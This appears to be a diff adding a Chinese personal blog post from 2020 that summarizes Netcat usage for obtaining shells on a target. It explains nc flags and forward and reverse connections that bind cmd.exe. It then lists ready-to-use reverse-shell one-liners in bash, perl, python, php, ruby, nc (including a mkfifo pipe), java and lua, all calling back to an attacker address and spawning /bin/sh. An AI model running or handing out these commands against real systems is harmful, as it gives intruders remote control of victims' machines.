@@ -1,0 +1,219 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>Netcat使用总结 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/1010/reverse.png')">
+            </div>
+          
+          <h2 class="post-title">Netcat使用总结</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2020-03-10</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/netcat/">
+                    netcat
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/nc/">
+                    nc
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>想用NC反弹shell时突然忘了语法，这里简单记录一下，备忘。</p>
+<!-- more -->
+<h3 id="0x01-语法如下">0x01 语法如下</h3>
+<blockquote>
+<p>-l  指定该参数，则意味着nc被当作server，侦听并接受连接<br>
+-p 指定端口<br>
+-s 指定发送数据的源IP地址，适用于多网卡机<br>
+-u 指定nc使用UDP协议，默认为TCP<br>
+-v 输出交互或出错信息，新手调试时尤为有用<br>
+-w 超时秒数，后面跟数字<br>
+-z 表示zero，表示扫描时不发送任何数据</p>
+</blockquote>
+<h3 id="0x02-正向nc连接">0x02 正向NC连接</h3>
+<p>攻击者主动去连接受害者，缺点是若目标处于内网时无法进行连接<br>
+<strong>Hacker：nc 192.168.1.2 4444   Target：nc -lvp 4444 -e cmd.exe</strong><br>
+<img src="https://tuchuang.looklook.workers.dev/1010/zx.png" alt="zx" loading="lazy"></p>
+<h3 id="0x03-反向连接">0x03 反向连接</h3>
+<p>受害主动去连接攻击者，反连需要互联网权限能穿透内网进行连接<br>
+<strong>Hacker：nc -lvp 4444   Target：nc 192.168.1.1 4444 -e cmd.exe</strong><br>
+<img src="https://tuchuang.looklook.workers.dev/1010/reverse.png" alt="reverse" loading="lazy"></p>
+<h3 id="0x04-常见问题">0x04 常见问题</h3>
+<blockquote>
+<p>1.Windows系统：<strong>-e cmd.exe</strong>，也可以是通过webshell上传的cmd.exe(加上上传路径)<br>
+2.Linux系统：<strong>-e /bin/bash</strong><br>
+3.若靶机没有nc环境，下面整理了网上收集的各个版本的shell写法</p>
+</blockquote>
+<pre><code>#bash版本：
+bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+
+#perl版本:
+perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+
+#python版本：
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+
+#php版本：
+php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+
+#ruby版本：
+ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
+
+#nc版本：
+nc -e /bin/sh 10.0.0.1 1234
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+
+nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
+
+#java版本
+r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+
+#lua
+lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');&quot;
+</code></pre>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/nmap.html/">
+              <h3 class="post-title">
+                下一篇：固定IP段之端口扫描
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
